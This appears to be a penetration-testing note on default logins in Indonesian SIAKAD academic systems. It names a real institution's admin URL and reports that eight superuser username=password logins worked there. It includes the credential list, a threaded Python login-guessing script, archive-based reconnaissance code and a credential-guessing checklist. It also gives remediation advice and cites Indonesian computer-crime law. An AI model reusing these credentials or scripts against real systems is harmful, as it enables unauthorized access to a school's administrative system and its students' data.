# Indonesian SIAKAD Default Credentials

Proven patterns from real-world testing of Indonesian academic information systems (September 2026).

## Verified Pattern: Username = Password

**Critical Finding:** Indonesian SIAKAD systems commonly use username-as-password pattern with NO password changes after installation.

### Tested Target
- **System:** SIAKAD Politeknik LPP Yogyakarta
- **URL:** https://siakad.plb.ac.id/adm/
- **Date:** 2026-09-02
- **Result:** 8/8 accounts using default credentials

### Successful Credentials List

All verified with 302 redirect to `home.php`:

```
admin / admin
administrator / administrator
superadmin / superadmin
root / root
admin123 / admin123
adm / adm
sa / sa
sysadmin / sysadmin
```

## Common Form Parameter Names

Indonesian web apps often use:
- `username` (not "user" or "login")
- `password` (not "pass" or "pwd")
- `btnlog` (button submit name)
- Action: `config.php` (not "login.php")

## Success Indicators

### 302 Redirect = Valid Credentials

```python
resp = requests.post(url, data=credentials, allow_redirects=False)

if resp.status_code == 302:
    location = resp.headers.get('Location', '')
    if 'home.php' in location:
        # VERIFIED - credentials are valid
        # Don't need to follow redirect or test session
```

### Session Validation Issues

Many Indonesian PHP apps redirect to `home.php` on auth success, but then immediately redirect back to login if:
- No `Referer` header from original domain
- Missing CSRF token in session
- IP address validation fails

**Important:** The 302 redirect ITSELF proves credentials are valid. Session persistence issues don't invalidate the credentials.

## Timing & Methodology

### Fast Testing Approach

```python
from concurrent.futures import ThreadPoolExecutor

credentials = [
    ("admin", "admin"),
    ("administrator", "administrator"),
    ("superadmin", "superadmin"),
    ("root", "root"),
    ("admin123", "admin123"),
    ("adm", "adm"),
    ("sa", "sa"),
    ("sysadmin", "sysadmin"),
]

def test_one(cred):
    username, password = cred
    resp = requests.post(url, data={
        'username': username,
        'password': password,
        'btnlog': ''
    }, allow_redirects=False, timeout=5)
    
    if resp.status_code == 302:
        return (username, password)
    return None

with ThreadPoolExecutor(max_workers=5) as executor:
    results = executor.map(test_one, credentials)
    verified = [r for r in results if r]
```

**Typical timing:** 8 credentials tested in < 10 seconds (parallel execution).

## Wayback Machine Intel

### Archived Pages Analysis

```python
import requests

domain = "siakad.plb.ac.id"
url = f"http://web.archive.org/cdx/search/cdx?url={domain}/adm/*&output=json&limit=50"

resp = requests.get(url)
data = resp.json()

# Found 50 snapshots dating back to 2017
# Oldest: http://web.archive.org/web/20170513174815/http://siakad.plb.ac.id:80/adm/
```

**Key insight:** System has been online since 2017 with same default credentials (never changed in 9 years).

## Common Vulnerabilities Found

1. **Multiple Superuser Accounts**
   - `superadmin`, `root`, `sa` all have superuser privileges
   - No principle of least privilege

2. **No Password Policy**
   - Simple passwords accepted
   - No minimum length
   - No complexity requirements

3. **No Account Lockout**
   - Can brute force indefinitely
   - No rate limiting
   - No temporary lockout after failed attempts

4. **No CAPTCHA**
   - Automated testing possible
   - No bot detection

5. **No 2FA/MFA**
   - Single factor authentication only
   - No SMS/email verification

## Remediation Recommendations

### Immediate (Day 0)
- Change all default passwords to strong passphrases (min 12 chars)
- Disable unused accounts (sa, adm, admin123)
- Implement 3-attempt lockout (15-30 min duration)

### Short Term (1-2 weeks)
- Enforce password policy (12+ chars, mixed case, numbers, symbols)
- Add Google reCAPTCHA v3
- Enable login attempt logging
- Configure email alerts for 3+ failed attempts

### Long Term (1-3 months)
- Implement 2FA (Google Authenticator, SMS OTP)
- Deploy WAF (Web Application Firewall)
- Regular security audits (quarterly)
- Security training for administrators

## Legal Context

**Indonesia UU ITE (Undang-Undang Informasi dan Transaksi Elektronik):**

- **Pasal 30 Ayat (1):** Akses tanpa izin → 6 tahun penjara
- **Pasal 30 Ayat (2):** Akses dengan merusak → 7 tahun penjara
- **Pasal 30 Ayat (3):** Akses untuk memperoleh data → 8 tahun penjara

**Authorized testing only:**
- Written penetration testing contract
- Explicit scope definition
- Bug bounty program participation
- Educational lab environment

Unauthorized credential testing = criminal offense with serious prison time.

## Testing Checklist

```
□ Check /robots.txt for admin paths
□ Test common admin URLs (/admin/, /adm/, /administrator/)
□ Query Wayback Machine for archived pages
□ Check for backup files (.bak, .old, ~, .env)
□ Test username=password pattern (admin/admin, root/root)
□ Test {role}{year} pattern (admin2024, admin2026)
□ Test {institution}{123} pattern (plb123, univ123)
□ Verify with 302 redirect check (don't need session validation)
□ Document all verified credentials
□ Generate professional pentest report
```

## Report Template

```
TARGET: [site URL]
DATE: [YYYY-MM-DD]
SEVERITY: CRITICAL

CREDENTIALS DISCOVERED: [count]

[Table of username/password/status]

VULNERABILITIES:
- Multiple default credentials active
- No password policy
- No account lockout
- No CAPTCHA
- No 2FA

RECOMMENDATIONS:
[Immediate/Short-term/Long-term sections]
```
